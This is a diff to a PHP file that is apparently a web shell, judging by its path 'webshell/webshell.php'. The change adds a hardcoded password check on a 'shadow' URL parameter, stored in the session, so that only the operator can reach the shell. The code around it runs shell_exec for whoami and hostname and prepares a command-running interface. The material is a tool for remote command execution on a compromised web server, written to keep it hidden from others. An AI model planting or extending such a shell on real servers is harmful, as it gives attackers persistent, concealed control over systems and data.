@@ -1,11 +1,29 @@
-<?php session_start(); ?>
+<?php 
+// http://localhost/webshell/webshell.php?shadow=xie_my_dianzi
+$password_required = 1;
+$shadow = 'xxxxxxxx';  // password required
+
+session_start(); ?>
 <?php
 
 if (empty($_SESSION['path'])) {
     $_SESSION['user'] = shell_exec('whoami');
     $_SESSION['host'] = shell_exec('hostname');
     $_SESSION['path'] = '~';
+    
 }
+
+if ($password_required) {
+    if (isset($_SESSION['shadow']) && $shadow === $_SESSION['shadow']) {
+    }else{
+        if (isset($_GET['shadow']) && $_GET['shadow'] === $shadow) {
+            $_SESSION['shadow'] = $shadow;
+        }else {
+            exit('hei hei!');
+        }
+    }
+}
+
 function showInfo($cmd = NULL) {
     $user = $_SESSION['user'];
     $host = $_SESSION['host'];
